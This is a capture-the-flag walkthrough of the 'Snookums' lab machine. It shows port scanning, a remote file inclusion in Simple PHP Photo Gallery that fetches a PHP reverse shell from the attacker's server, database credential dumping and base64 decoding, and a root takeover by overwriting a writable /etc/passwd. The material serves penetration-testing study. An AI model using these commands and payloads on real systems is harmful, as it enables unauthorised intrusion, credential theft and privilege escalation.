<h2>Recon</h2>

<h3>PortScanning</h3>

>command: sudo nmap -A 192.168.53.58 -p- -T4 -v

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 02:24 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 02:24
Completed NSE at 02:24, 0.00s elapsed
Initiating NSE at 02:24
Completed NSE at 02:24, 0.00s elapsed
Initiating NSE at 02:24
Completed NSE at 02:24, 0.00s elapsed
Initiating Ping Scan at 02:24
Scanning 192.168.53.58 [4 ports]
Completed Ping Scan at 02:24, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:24
Completed Parallel DNS resolution of 1 host. at 02:24, 0.04s elapsed
Initiating SYN Stealth Scan at 02:24
Scanning 192.168.53.58 [65535 ports]
Discovered open port 111/tcp on 192.168.53.58
Discovered open port 21/tcp on 192.168.53.58
Discovered open port 22/tcp on 192.168.53.58
Discovered open port 445/tcp on 192.168.53.58
Discovered open port 3306/tcp on 192.168.53.58
Discovered open port 80/tcp on 192.168.53.58
Discovered open port 139/tcp on 192.168.53.58
SYN Stealth Scan Timing: About 6.94% done; ETC: 02:32 (0:06:55 remaining)
SYN Stealth Scan Timing: About 24.74% done; ETC: 02:29 (0:03:06 remaining)
SYN Stealth Scan Timing: About 43.84% done; ETC: 02:28 (0:01:57 remaining)
SYN Stealth Scan Timing: About 64.01% done; ETC: 02:28 (0:01:08 remaining)
Discovered open port 33060/tcp on 192.168.53.58
SYN Stealth Scan Timing: About 53.50% done; ETC: 02:29 (0:02:11 remaining)
SYN Stealth Scan Timing: About 63.38% done; ETC: 02:29 (0:01:45 remaining)
SYN Stealth Scan Timing: About 73.91% done; ETC: 02:29 (0:01:14 remaining)
SYN Stealth Scan Timing: About 87.90% done; ETC: 02:29 (0:00:33 remaining)
Completed SYN Stealth Scan at 02:29, 267.52s elapsed (65535 total ports)
Initiating Service scan at 02:29
Scanning 8 services on 192.168.53.58
Completed Service scan at 02:29, 32.31s elapsed (8 services on 1 host)
Initiating OS detection (try #1) against 192.168.53.58
Retrying OS detection (try #2) against 192.168.53.58
Initiating Traceroute at 02:30
Completed Traceroute at 02:30, 0.16s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 02:30
Completed Parallel DNS resolution of 2 hosts. at 02:30, 0.06s elapsed
NSE: Script scanning 192.168.53.58.
Initiating NSE at 02:30
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 02:30, 40.62s elapsed
Initiating NSE at 02:30
Completed NSE at 02:30, 2.17s elapsed
Initiating NSE at 02:30
Completed NSE at 02:30, 0.00s elapsed
Nmap scan report for 192.168.53.58
Host is up (0.15s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.53
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a796712c7ec133a96bdd3b47cf39515 (RSA)
|   256 a8a3a788cf3727b54d451379dbd2bacb (ECDSA)
|_  256 f20713191f29de19487cdb4599f9cd3e (ED25519)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Simple PHP Photo Gallery
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.93%I=7%D=3/5%Time=6403F07B%P=x86_64-pc-linux-gnu%r(NU
SF:LL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOpt
SF:ions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVersi
SF:onBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2B
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fIn
SF:valid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%
SF:r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\
SF:x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,
SF:"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY00
SF:0")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x
SF:05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOptions,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\
SF:x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a
SF:\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000"
SF:)%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(
SF:ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x
SF:05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 3.X|4.X|5.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:5.1
Aggressive OS guesses: Linux 3.10 - 3.12 (91%), Linux 4.4 (91%), Linux 4.9 (91%), Linux 3.10 (86%), Linux 3.10 - 3.16 (86%), Linux 3.10 - 4.11 (85%), Linux 3.11 - 4.1 (85%), Linux 3.2 - 4.9 (85%), Linux 5.1 (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.335 days (since Sat Mar  4 18:27:50 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: SNOOKUMS; OS: Unix

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m15s, median: 0s
| smb2-time: 
|   date: 2023-03-05T01:30:04
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.4)
|   Computer name: snookums
|   NetBIOS computer name: SNOOKUMS\x00
|   Domain name: \x00
|   FQDN: snookums
|_  System time: 2023-03-04T20:30:07-05:00

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   152.45 ms 192.168.49.1
2   154.34 ms 192.168.53.58

NSE: Script Post-scanning.
Initiating NSE at 02:30
Completed NSE at 02:30, 0.00s elapsed
Initiating NSE at 02:30
Completed NSE at 02:30, 0.00s elapsed
Initiating NSE at 02:30
Completed NSE at 02:30, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 348.74 seconds
           Raw packets sent: 196877 (8.666MB) | Rcvd: 238 (11.344KB)
```
From our scan we have 8 opened ports. Port 21 which runs ftp, port 22 which runs ssh, port 80 which runs http, port 111 which runs rpcbind, port 139&445 which runs netbios, port 3306 which runs mysql and port 33060 which runs mysqlx. Our enumeration will be focused on port 21 and port 80.



<h2>Enumeration Port 21</h2>

Since anonymous login is allowed for this ftp server lets try to login with these creds

```username:anonymous```                   ```password:anonymous```

>command: ftp 192.168.53.58

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ ftp 192.168.53.58 
Connected to 192.168.53.58.
220 (vsFTPd 3.0.2)
Name (192.168.53.58:bl4ck4non): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
cool, now we are logged in. Lets check the files available on this ftp server

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ ftp 192.168.53.58
Connected to 192.168.53.58.
220 (vsFTPd 3.0.2)
Name (192.168.53.58:bl4ck4non): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||60864|).
ftp: Can't connect to `192.168.53.58:60864': Connection timed out
200 EPRT command successful. Consider using EPSV.

```
We are getting the "connection timed out" error. Lets move on to the next port




<h2>Enumeration Port 80</h2>

Going to the webpage you should get this

![image](https://user-images.githubusercontent.com/67879936/222937250-b7d1d01e-4c19-4870-88e1-3448c3bbd267.png)

The webpage is running on ```simple php photo gallery v0.8```, lets check online for available exploits

![image](https://user-images.githubusercontent.com/67879936/222937326-8c7d8e81-065b-4df9-a517-1acea36213ad.png)

cool, we found exploits for this CMS. Lets go ahead and exploit this vulnerability.




<h2>Exploitation</h2>

Link to Exploit:https://www.exploit-db.com/exploits/48424

Reading the exploit, I saw the Poc (proof of concept)

![image](https://user-images.githubusercontent.com/67879936/222937717-8e083a9d-0118-454b-8c62-420ab46ebf14.png)

Lets navigate to that url, but to test a possible RFI (Remote File Inclusion), i'll host a file on my webserver and will try to get access it from that url

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ ls
snookums
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Link:http://192.168.53.58/image.php?img=http://192.168.49.53/snookums

![image](https://user-images.githubusercontent.com/67879936/222937841-eac8d210-0f79-4bca-8281-0ae1bf0a9bd2.png)

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ ls
snookums
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.53.58 - - [05/Mar/2023 03:09:04] "GET /snookums HTTP/1.0" 200 -
```
cool, now lets go ahead and host our reverse shell so we can get a shell back to our machine. I will be making use of php-pentestmonkey

Link to get php-pentestmonkey rev shell:https://github.com/pentestmonkey/php-reverse-shell

![image](https://user-images.githubusercontent.com/67879936/222937958-59f40b30-54b6-4021-8937-7844629cd63b.png)

set your $ip and also the port you would want to listen on

Also, ensure you set your netcat listener

>command: nc -nvlp 445

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ ls
shell.php  snookums
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
![image](https://user-images.githubusercontent.com/67879936/222938236-cce086c5-8e34-47a1-9fcf-87fcaa7335ba.png)

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.53.58 - - [05/Mar/2023 03:23:48] "GET /shell.php HTTP/1.0" 200 -
```
Lets check out netcat listener to see if we captured anything

![image](https://user-images.githubusercontent.com/67879936/222938269-bd4f52c6-8039-49c8-9c73-0d5a20157e3b.png)

cool, we got a shell as user ```apache```. Lets stabilize this shell

```
python3 -c “import pty;pty.spawn(‘/bin/bash’)”
ctrl + z (to background)
stty raw -echo && fg
export TERM=xterm
```
![image](https://user-images.githubusercontent.com/67879936/222938485-76a77df9-9511-4f2b-90af-26222427aaea.png)

Now that we've done that lets go ahead and escalate our privileges



<h2>Privilege Escalation</h2>

Checking the ```/var/www/html``` directory I found a .db file

![image](https://user-images.githubusercontent.com/67879936/222938935-ace757a1-890b-4c83-9d00-08f2a3ee8522.png)

cool, the .db file contains DB username and password. Lets go ahead and connect to the mysql database

>command: mysql -u root -p

![image](https://user-images.githubusercontent.com/67879936/222939000-d5e53f80-cef2-4949-9304-d4824b05a63a.png)

we are logged in

```
bash-4.2$ mysmysql -u root -p
mysql -u root -p
Enter password: MalapropDoffUtilize1337

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 16
Server version: 8.0.20 MySQL Community Server - GPL

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| SimplePHPGal       |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.03 sec)

mysql> use SimplePHPGal;
use SimplePHPGal;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables
show tables
    -> ;
;
+------------------------+
| Tables_in_SimplePHPGal |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.00 sec)

mysql> select * from users;
select * from users;
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
+----------+----------------------------------------------+
3 rows in set (0.00 sec)

mysql> 
```
We got usernames and passwords, but the user we are concerned with here is ```michael``` so lets go ahead and decode the password encrypted in base64

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ echo "U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==" | base64 --decode
SG9ja1N5ZG5leUNlcnRpZnkxMjM=                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ echo "SG9ja1N5ZG5leUNlcnRpZnkxMjM=" | base64 --decode
HockSydneyCertify123                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ 
 ```
During our scan we saw port 22 opened, so with the password we found we can try to login to the ssh server as user ```michael```

```username:michael```                ```password:HockSydneyCertify123```

![image](https://user-images.githubusercontent.com/67879936/222939365-fe6995e4-5e88-49fd-bf6b-1cfe3423de3a.png)

cool, lets escalate our privileges further

I ran linpeas and found something interesting

![image](https://user-images.githubusercontent.com/67879936/222939501-479d5931-411b-4c99-aa13-0b38f35a4558.png)

The ```/etc/passwd``` file is writable cool. We'll copy the content of the passwd file to our machine then modify it.

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ gedit passwd           
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ cat passwd                                          
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
michael:x:1000:1000:Michael:/home/michael:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
```
Lets generate a password using openssl      

>command: openssl passwd 1234567890

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ openssl passwd 1234567890
$1$jKxj2MJv$qfMmM3mHFTgVv.2t27Rl4.
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ 
```
We'll add this hashed password to the passwd file we created

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ gedit passwd
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/snookums]
└─$ cat passwd
root:$1$jKxj2MJv$qfMmM3mHFTgVv.2t27Rl4.:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
michael:x:1000:1000:Michael:/home/michael:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
```
observe I replaced the ```x``` from the root user to the hashed password. Now, lets send this file to the target's machine so it can overwrite the previous passwd file

![image](https://user-images.githubusercontent.com/67879936/222939908-8f0fdc33-96d1-4a65-affb-a288a38b0d2d.png)

it worked, now lets switch user to root user then provide the password we hashed using openssl, in my case the password was ```1234567890```.

![image](https://user-images.githubusercontent.com/67879936/222939950-4ace5808-5605-4235-9e35-156e1bcbf4ce.png)

Boom!!! We got shell as the root user.

That will be all for today
<br> <br>
[Back To Home](../../index.md)




































